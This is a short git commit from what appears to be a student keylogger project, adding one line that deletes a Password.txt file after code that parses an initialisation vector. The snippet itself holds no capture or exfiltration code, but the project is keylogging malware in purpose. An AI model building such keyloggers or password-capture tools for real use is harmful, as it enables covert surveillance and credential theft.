e4202050c9baa5f2b87e2bfc34d1779e988ef139
Phan Huỳnh Thiên Phúc <22521139@gm.uit.edu.vn>
2023-11-26 09:00:34 +0700

    Them dong delete file Password.txt

--- Key_Logger/KeyLogger/Form1.cs
+++ Key_Logger/KeyLogger/Form1.cs
@@ -135,6 +135,7 @@ namespace KeyLogger
                 {
                     iv[i / 2] = Convert.ToByte(detached[1].Substring(i, 2), 16);
                 }
+                File.Delete("./Password.txt");
             }
 
         }
